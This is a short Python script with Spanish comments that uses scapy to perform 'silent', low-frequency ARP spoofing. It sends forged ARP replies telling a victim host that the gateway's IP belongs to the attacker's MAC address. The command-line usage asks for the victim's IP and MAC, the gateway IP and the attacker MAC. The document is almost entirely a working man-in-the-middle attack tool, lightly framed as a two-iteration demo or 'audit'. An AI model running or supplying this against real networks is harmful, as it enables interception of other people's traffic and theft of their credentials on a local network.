#!/usr/bin/env python3
"""ARP Spoofing de baja frecuencia (demo: 2 iteraciones, intervalo 2s)."""
import sys
import time
from scapy.all import ARP, Ether, sendp


def envenenar_arp_lento(target_ip, target_mac, gateway_ip, attacker_mac, intervalo_s=2.0, max_iter=2):
    trama_cliente = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    print(f"[*] Envenenamiento silencioso contra {target_ip} ({max_iter} iteraciones, {intervalo_s}s)")
    for i in range(max_iter):
        sendp(trama_cliente, verbose=False)
        print(f"[+] ARP Reply {i+1}/{max_iter}: {gateway_ip} -> MAC {attacker_mac}")
        if i + 1 < max_iter:
            time.sleep(intervalo_s)
    print("[*] Auditoría ARP finalizada")


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Uso: python3 arp_slow.py <IP_Victima> <MAC_Victima> <IP_Gateway> <MAC_Atacante>")
        sys.exit(1)
    envenenar_arp_lento(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], 2.0, 2)
